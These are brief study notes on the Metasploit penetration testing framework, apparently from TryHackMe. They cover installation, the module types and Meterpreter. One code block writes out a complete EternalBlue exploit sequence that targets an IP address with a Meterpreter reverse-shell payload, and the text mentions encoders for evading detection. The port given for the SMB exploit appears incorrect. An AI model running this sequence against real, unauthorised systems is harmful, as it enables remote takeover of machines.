#+TITLE: Metasploit Framework
#+TAGS: :framework:metasploit:

	Metasploit is one of the most popular penetration testing frameworks around. It contains a large database of almost every major CVE, which you can easily use against a machine. (TryHackMe).

	#+begin_src shell
		sudo apt install metasploit-framework
	#+end_src

	*Example*

	`msfconsole -h` shows advanced options for starting the console, such as `--quiet`, `--output` or `--logger`.

	#+begin_src shell
		msfconsole
		search "eternal blue"
		use exploit/windows/smb/ms17_010_eternalblue
		set RHOSTS 192.168.1.1
		set RPORT 80
		set PAYLOAD windows/x64/meterpreter/reverse_tcp
		exploit
	#+end_src

* Modules

	Metasploit consists of modules.

	 file:./images/metasploit-architecture.png]]

	Includes *most* of the interfaces and modules.

	- *Exploit*: holds of the exploit code
	- *Payload*: contains the various bits of shellcode sent to have executed following exploitation
	- *Auxiliary*: commonly used in scanning and verifing machines are exploitable
	- *Post*: provides looting and pivoting after exploitation
	- *Encoder*: utilized in payload obfuscation, allows to modify appearance of exploits to avoid signature detection
	- *NOP*: generates pad buffers

* Meterpreter

	Meterpreter is metasploits own "control center" where you can do various things to interact with the machine. (TryHackMe)

	Note: Regular shells can usually be upgraded to meterpreter shells by using the module post/multi/manage/shell_to_meterpreter.
